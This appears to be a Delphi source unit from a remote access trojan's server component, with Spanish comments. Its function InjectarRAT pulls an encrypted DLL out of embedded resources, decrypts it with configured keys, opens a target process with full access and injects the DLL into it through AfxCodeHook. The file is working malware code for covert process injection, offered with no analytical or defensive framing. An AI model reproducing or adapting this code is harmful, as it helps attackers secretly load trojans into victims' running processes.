unit Servidor;

interface
uses
  Windows,
  AfxCodeHook, //Creditos: Aphex;
  Variables,
  Funciones;

function InjectarRAT(ResName: string; pid: dword): Boolean;

implementation

function InjectarRAT(ResName: string; pid: dword): Boolean;
var
  ResourceLocation: HRSRC;
  ResourceSize: Longword;
  ResourceHandle: THandle;
  ResourcePointer: Pointer;
  handleWindow: Integer;
  Tempstr: string;
begin
  Result := True;
  //ResourceLocation := FindResource(HInstance, pchar('mi_dll'), RT_RCDATA);
  ResourceLocation := FindResource(SysInit.HInstance, PChar(ResName), 'DLL');
  //ShowMessage('es: '+IntTOStr(ResourceLocation));
  if ResourceLocation <> 0 then
    begin
      ResourceSize := SizeofResource(SysInit.HInstance, ResourceLocation);
      if ResourceSize <> 0 then
        begin
          ResourceHandle := LoadResource(SysInit.HInstance, ResourceLocation);
          if ResourceHandle <> 0 then
            begin
              ResourcePointer := LockResource(ResourceHandle);
              HandleWindow := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
              SetLength(tempstr, ResourceSize);
              Move(ResourcePointer^, tempstr[1], ResourceSize); //copiamos a tempstr y desciframos
              tempstr := cifrar(cifrar(tempstr, StrToInt(configuracion.snumerocifrado2)), StrToInt(configuracion.snumerocifrado));
              InjectLibrary(HandleWindow, @tempstr[1]); //inyectamos despues de descifrar
            end
          else
            Result := False;
        end
      else
        Result := False;
    end
  else
    Result := False;
end;

end.
